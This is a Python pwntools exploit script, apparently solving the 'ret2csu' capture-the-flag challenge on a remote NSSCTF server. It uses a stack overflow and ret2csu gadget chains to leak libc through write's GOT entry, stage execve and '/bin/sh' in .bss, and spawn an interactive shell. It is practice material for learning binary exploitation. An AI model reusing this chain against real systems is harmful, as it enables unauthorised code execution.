from pwn import *

context.log_level = "debug"
#io = process("./ret2csu")
io = remote("node5.anna.nssctf.cn", 26613)
elf = ELF("./ret2csu")
libc = ELF("./libc.so.6")


def csu_gadget(part1, part2, ret, jmp2, arg1=0x0, arg2=0x0, arg3=0x0):
    payload = p64(part1)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(arg1)
    payload += p64(arg2)
    payload += p64(arg3)
    payload += p64(jmp2)
    payload += p64(part2)
    payload += cyclic(0x38)
    payload += p64(ret)
    return payload


csu_part1 = 0x4012AA
csu_part2 = 0x401290
main_addr = 0x4011E1
bss_base = 0x404100
write_got = elf.got["write"]
read_got = elf.got["read"]


payload = b"a" * (0x100 + 0x8) + csu_gadget(
    csu_part1, csu_part2, main_addr, write_got, 1, write_got, 8
)
io.send(payload)
io.recvuntil(b"Ok.\n")
write_addr = u64(io.recv(8))
print("write address = ", hex(write_addr))
base_libc = write_addr - libc.sym["write"]
print("base libc address = ", hex(base_libc))
execve_addr = base_libc + libc.sym["execve"]
print("execve address = ", hex(execve_addr))

payload = b"a" * (0x100 + 0x8) + csu_gadget(
    csu_part1, csu_part2, main_addr, read_got, 0, bss_base, 16
)

io.recvuntil(b"Input:")

io.send(payload)
io.send(p64(execve_addr) + b"/bin/sh\x00")

payload = b"a" * (0x100 + 0x8) + csu_gadget(
    csu_part1, csu_part2, main_addr, bss_base, bss_base + 8, 0, 0
)
io.recvuntil(b"Input:")
io.send(payload)
io.interactive()
